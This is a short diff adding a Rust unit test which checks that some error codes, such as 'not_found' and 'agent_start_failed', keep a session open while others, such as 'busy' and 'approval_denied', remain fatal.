+#[test]
+fn hostile_the_new_codes_keep_the_session_and_the_old_fatal_ones_stay_fatal() {
+    for c in ["not_found", "project_closed", "agent_start_failed"] {
+        let e = error(c);
+        assert_eq!(code(&e), c);
+        assert!(!e.fatal(), "{c} must keep the session open (R9.3)");
+    }
+    for c in ["busy", "overloaded", "approval_denied"] {
+        assert!(error(c).fatal(), "{c} still ends the session");
+    }
+}
